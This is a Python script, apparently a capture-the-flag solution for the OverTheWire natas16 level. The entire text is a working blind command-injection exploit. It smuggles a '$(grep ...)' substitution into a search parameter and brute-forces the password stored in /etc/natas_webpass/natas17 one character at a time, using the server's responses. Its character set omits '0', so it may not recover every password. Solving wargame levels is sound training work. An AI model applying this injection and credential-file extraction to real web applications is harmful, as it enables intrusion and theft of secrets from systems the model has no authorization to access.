#!/usr/bin/python
import httplib
import urllib
import base64
 
h = httplib.HTTPConnection("natas16.natas.labs.overthewire.org")
headers = {}
username = "natas16"
password = "********************************"
login = base64.b64encode(username + ":" + password).replace("\n", "")
headers["Authorization"] = ("Basic " + login)
 
passwd = ""
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
index = 0
 
while index != 32:
  for c in charset:
    passwd += c
    query = urllib.quote_plus("$(grep -E ^" + passwd + ".* /etc/natas_webpass/natas17)hello")
    h.request("POST", "/?needle=" + query + "&submit=Search", "", headers)
    raw = h.getresponse()
    output = raw.read()
    if output.count("hello") == 0:
      print("Current string is: " + passwd)
      index += 1
      break
    else:
      passwd = passwd[:-1]
    h.close()
print("The password is: " + passwd)
